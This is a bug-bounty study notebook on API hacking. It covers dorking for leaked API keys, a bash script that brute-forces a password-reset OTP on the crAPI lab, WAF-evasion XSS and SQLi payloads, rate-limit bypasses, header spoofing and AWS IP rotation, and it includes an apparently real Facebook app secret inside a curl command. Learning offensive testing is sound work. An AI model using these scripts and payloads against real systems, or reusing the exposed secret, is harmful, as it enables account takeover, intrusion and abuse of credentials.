

```ad-note
title: Great Ressource
https://github.com/arainho/awesome-api-security

```

# RECON

## PASSIVE

### Google dorking

- First try too google the org's API it could be public and advertized 

![[Capture d’écran 2023-07-06 014532.png]]

```go
intitle:"api" site:"8x8.com"
intitle:"json" site:"8x8.com"


intitle:"index of" intext:"api"
inurl:"/api/*" intext:"index of"
intext:api filetype:env
intitle:"index of" api_key OR "api key" OR apiKey -pool
intext:APIKey ext:js | xml | yaml | txt | conf | py intitle:"index of"
"api" ext:log
```

### Git dorking

```
extention:.json 8x8
"Authorization: Bearer"
```


### Waybackmachine

### [[Shodan]] Dorking

## ACTIVE

```bash
amass enum -active -d target-name.com |grep api
```

you can add *community* or *workshop* after url
```bash
ffuf -u target.com/community/FUZZ -w dirb.txt 
```
but `kiterunner` is the best for *APIs*

https://github.com/assetnote/kiterunner


# Tips

 - [x]  The headers, inject SQLi 
![[1 QFRffJrudxELmb6PwgIySA.webp]]

 - [x] Extention to save website frontend source code https://chrome.google.com/webstore/detail/save-all-resources/abpdnfjocnmdomablahdcfnoggeeiedb
 - [ ] 


 - [x]  Look in *strings.xml* (**APK**)
 ![[1 KJgDMoQhCsQUTdRehtusNA.webp]]
you'ill find this **app_id** that  can be used to grab a secret token , that can be used to make GraphQL calls to the Facebook .

```
curl https://graph.facebook.com/oauth/access_token?client_id=appid&client_secret=client_token&redirect_uri=&grant_type=client_credentials_](https://graph.facebook.com/oauth/access_token?client_id=327925112148720&client_secret=b79608a0b7040eceeea67aa659eb71a3&redirect_uri=&grant_type=client_credentials"
````

 
 - [ ] Account takeover via *OTP* (Forgot Password)
```
#!/bin/bash

FPWD_URL="http://crapi.apisec.ai/identity/api/auth/forget-password"
OTP_URL="http://crapi.apisec.ai/identity/api/auth/v2/check-otp"
EMAIL="test@acme.com"
NEW_PWD="Passme123"

# First need to API to generate the OTP on a forget password event
RESULT=$(curl $FPWD_URL \
        -H 'Content-Type: application/json' \
        --data-raw "{\"email\":\"$EMAIL\"}" \
        --insecure -s)

for OTP in {0000..9999}; do
    RESULT=$(curl $OTP_URL \
             -H 'Content-Type: application/json' \
            --data-raw "{\"email\":\"$EMAIL\",\"otp\":\"$OTP\", \"password\":\"$NEW_PWD\"}" \
            --insecure -s| jq -j .status)
    if [[ "200" == $RESULT ]]; then
        echo "Bruteforced OTP ($OTP). Password for $EMAIL reset to $NEW_PWD."
        break
    fi
done
```

# Notes From Book

## WAF

### Detecting WAF

We get detected by :
*IP address*, *origin* **headers**, *authorization tokens*, and *metadata*. Metadata is information extrapo-lated by the API defenders, such as patterns of requests, the rate of request,and the combination of the headers included in requests.

> Instead of the attack-first, ask-questions-later approach, I recommend you first use the API as it was intended. That way, you should have a chance to understand the app’s functionality before getting into trouble. You could, for example, review documentation or build out a collection of valid requests and then map out the API as a valid user.

- A *302* *response* that forwards you to a CDN
- Using *nmap* 
```shell
nmap -p 80 –script http-waf-detect http://hapihacker.com
```
- Using *Wafw00f*
```shell
wafw00f [target]
```

- Paying attention to *headers* such as *X-CDN*,*CDNs* provide a way to reduce latency globally by caching the API pro-
vider’s requests. ,  CDNs will often provide WAFs as a service
**X-CDN**: akamai
**X-CDN**: Incapsula
**X-Kong-Proxy-Latency**: 123
**Server**: Zenedge
...

### Evasing 

#### Null Bytes
- Could terminate the API security control filters that may be in place.

- If the null byte is processed by a backend program thatvalidates user input, that validation program could be bypassed because itstops processing the input.

string terminators you can use
```
%00
0x00
//
;
%
!
?
[]
%5B%5D
%09
%0a
%0b
%0c
%0e

````
Can be placed in **different parts** of the request to attempt to bypass any restrictions in place.  
```xml
{
"uname": "<s%00cript>alert(1);</s%00cript>"
"email": "hapi@hacker.com"
}
```

Wordlist
```json
~/tools/SecLists-2023.2Fuzzing/Metacharacters.fuzzdb.txt
```

#### Case Switching 

```json
<sCriPt>alert('supervuln')</scrIpT>
SeLeCT * RoM all_tables
sELecT @@vErSion
```
#### Encoding 

When encoding, focus on the characters that may be blocked, such as
these:
```json
< > ( ) [ ] { } ; ' / \ |
```

You could either encode part of a payload

```json
%3cscript%3ealert %28%27supervuln%27%28%3c%2fscript %3e
%3c%73%63%72%69%70%74%3ealert('supervuln')%3c%2f%73%63%72%69%70%74%3e
```
#### Automation w/Burp Intruder & Wfuzz

-  *Intruder* -> *Payloads*, **Payload Processing Option** allows you to add rules that Burp will apply to each payload before it is sent.

- Let's say we can bypass WAF by The following rule , we can apply it then start fuzzing for passwords or whatso

- Rules are applied from **TOP** to **BOTTOM** , in this example , suffix and prefix are added after encoding so they are not encoded.
![[Capture d’écran 2023-08-01 004051.png]]

- `Wfuzz` [Usage](https://wfuzz.readthedocs.io/en/latest/user/advanced.html#iterators-combining-payloads)

- List encoding methods:
```js
wfuzz -e encoders
```

- Encode payload before it's sent
```js
wfuzz -z file,wordlist/general/common.txt,md5 http://testphp.vulnweb.com/FUZZ
```
- Multiple Encoders
```js
wfuzz -z list,1-2-3,md5-sha1-none http://webscantest.com/FUZZ
```

### Testing Rate Limits

- API providers may include its rate limiting details publicly on its website or in API documentation. 
- Check Headers
```js
x-rate-limit:
x-rate-limit-remaining:
```
- Other APIs won't have an indication but once you exceed the limit you receive `429 Too Many Requests`
- `Retry-After:` Indicates when you can submit additional requests.

- *How to test Rate Limiting ?*
- [ ] avoid being rate limited altogether
- [ ] bypass the mechanism that is blocking you once you are rate limited (Blocked because of IP ? Auth Token ?)


### A Note on Lax Rate Limits

Let's say `Rate limit  = 15 000 Request/min`

*-t* option allows you to specify the concurrent **number of connections**, 
*-s* option allows you to specify a **time delay** between requests.

![[Capture d’écran 2023-08-01 010914.png]]


This will send `12 000 Request/min`
```shell
wfuzz -s 0.0005
```
Or use Burp *Intruder*/*Ressource Pool*

|                                            |     |
| ------------------------------------------ | --- |
| ![[Capture d’écran 2023-08-01 011645.png]] | ![[Capture d’écran 2023-08-01 011508.png]]    |

### Path Bypass

- If you reach the rate limit, try *Null Bytes* , *Case* &  *Meaningless Parameters* at the end , this could :
	  Restart the rate limit
	  Bypass Rate limiting

```js
POST /api/myprofile%00
POST /api/myprofile%20
POST /api/myProfile
POST /api/MyProfile
POST /api/my-profile

POST /api/myprofile?test=1
```

If meaningless Parameters are restarting rate limiting just change parameter value in every request :

```js
POST /api/myprofile?test=§1§
```

Set the attack type to *pitchfork* and use the same value for both payload positions.
This tactic allows you to use the smallest number of requests required to brute-force the **uid**.

### Origin Header Spoofing 

Add these headers **one by one** (If you include all headers at once, you may
receive a 431 Request Header Fields Too Large status code)
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

Sometimes, **User-Agent** header will be used in combination with other headers to help identify and block an attacker. 

Use `SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt` to cycle trough user-agents

```ad-done
title: Bypassed 
You’ll know you’ve succeeded if an `x-rate-limit` header **resets** or if you’re able to make successful requests after being blocked.

```


### Rotating IP Addresses in Burp Suite

If WAF Blocks IP, Use *IP Rotate* **Burp Extension**

![[Capture d’écran 2023-08-01 122633.png]]

- Install *boto3*

```python
pip3 install boto3
```

- Install *Jython* for BurpSuite
- Install *IP Rotate*

- *Add User* in aws -> IAM
![[Capture d’écran 2023-08-01 123117.png]]

![[Capture d’écran 2023-08-01 123340.png]]


![[Capture d’écran 2023-08-01 123417.png]]


Create User

![[Capture d’écran 2023-08-01 123526.png]]

Download *CSV file* containing your user’s **access key** and **secret access key**.

In Burp :

![[Capture d’écran 2023-08-01 124007.png]]

*Save Keys* => *Enable* 

```ad-success
title: Bypassed
Now, security controls that block you based solely on your IP address
will stand no chance.

```

## [GraphQL](obsidian://open?vault=Obsidian%20Vault&file=00%20-%20Bug%20Bounty%2FWeb%20Technologies%2FGraphql)

